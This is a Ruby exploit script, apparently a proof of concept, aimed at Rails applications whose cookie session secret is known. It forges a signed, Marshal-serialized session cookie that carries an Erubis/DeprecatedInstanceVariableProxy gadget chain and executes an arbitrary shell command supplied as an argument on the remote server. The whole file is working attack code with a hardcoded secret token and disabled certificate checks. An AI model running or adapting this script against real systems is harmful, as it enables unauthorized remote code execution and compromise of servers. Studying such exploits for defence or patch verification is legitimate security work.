#!/usr/bin/ruby
require "openssl"
require "cgi"
require "net/http"
require "uri"
require "base64"
require "openssl"
require "cgi"
require "net/http"
require "uri"
require "erubis"
require "active_support/message_verifier"
module ActiveSupport;module Deprecation;class DeprecatedInstanceVariableProxy;end;end;end


http = Net::HTTP.new(ARGV[1], 8443)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE 

secret_token = "641dd6454584ddabfed6342cc66281fb"

# Construct your evil hash
code = "%x("+ARGV[0].to_s+")"

erubis = Erubis::Eruby.allocate
erubis.instance_variable_set :@src, "#{code}; 1"

proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
proxy.instance_variable_set :@instance, erubis
proxy.instance_variable_set :@method, :result
proxy.instance_variable_set :@var, "@result"

#preparing the exploit and converting it to a valid session hash.
my_evil_session_hash = {"session_id" => "", "exploit" => proxy}
dump = Base64.encode64(Marshal.dump(my_evil_session_hash))
hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, dump)

#Sending the exploit
puts "[+] Sending cookie..."
rqst = Net::HTTP::Get.new("/")
res = http.request(rqst)
reponse_cookie = res['Set-Cookie'].to_s
cookie_name = reponse_cookie.split("=").first
rqst['Cookie'] = cookie_name+"=#{CGI.escape("#{dump}--#{hmac}")}"
res = http.request(rqst)

#Check for cookie
value = reponse_cookie.split("=", 2)[1]
data = CGI.unescape(value.split("--").first)
hmac2 = value.split("--").last.split(";", 2).first
expected_hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret_token, data)

#Debug
puts expected_hmac
puts "\n\n\n\n"
puts hmac2



